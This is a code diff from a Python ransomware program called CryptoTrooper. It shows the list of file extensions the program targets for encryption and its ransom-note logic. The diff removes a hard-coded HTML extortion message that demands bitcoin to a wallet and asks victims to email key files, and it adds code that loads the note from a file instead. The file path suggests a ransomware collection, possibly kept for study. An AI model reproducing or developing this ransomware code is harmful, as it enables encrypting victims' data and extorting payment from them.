@@ -16,25 +16,6 @@ encryption_timeout = int(sys.argv[2])
 encrypted_symbol = "enc_"
 ext = ('.jpg', '.png', '.bmp', '.raw', '.c', '.java', '.class', '.cpp', '.h', '.jar', '.txt', '.doc', '.docx', '.pdf', '.ptx', '.ppt', '.rar', '.zip', '.7z', '.mp3', '.mp4', '.mpg', '.mpeg', '.avi', '.tar.gz', '.sql', '.xml', '.py', '.js', '.php', '.pps', '.cs', '.xls', '.xlsx', '.3gp', '.mov', '.mkv', '.vob', '.wps', '.odt')
 base_path = sys.argv[1]
-ransom_message = "<html>\n\
-	<style>\n\
-		body{\n\
-			background-image: url('bg.jpg');\n\
-			background-size: cover;\n\
-			color:white;\n\
-		}\n\
-	</style>\n\
-	<body>\n\
-		<b>!WARNING!</b><br><br>\n\
-		<b>YOU ARE INFECTED</b><br>\n\
-		<b>WITH THE MOST CRYPTOGRAPHICALLY ADVANCED RANSOMWARE</b><br>\n\
-		<b>CryptoTrooper</b><br><br>\n\
-		<b>All your data of all your users, all your databases and all your Websites are encrypted</b><br><br>\n\
-		<b>You have one week to transfer 0.314 bitcoins to 4Kg7Cmooris7cLErTsijq6qR1FH3cTiK2H<b><br>\n\
-		<b>After payment, send /key.enc and /key.iv to mail@host.net</b><br>\n\
-		<b>You will receive the key to use with /decipher.sh</b>\n\
-	</body>\n\
-</html>"
 
 def Encrypt(fileToEncrypt, iv, aes_obj):
     file_size = str(os.path.getsize(fileToEncrypt)).zfill(16)
@@ -77,6 +58,9 @@ def GetAllFiles(dirName):
 def WriteUserMessage():
     file_name = "ransom.pay"
     file_path = os.path.join(base_path, file_name)
+    ransom_message_file = open("/RealRansomwares/ransom_message.txt", 'r')
+    ransom_message = ransom_message_file.read()
+    ransom_message_file.close()
     with open(file_path, 'w') as ransomFile:
         ransomFile.write(ransom_message)
 
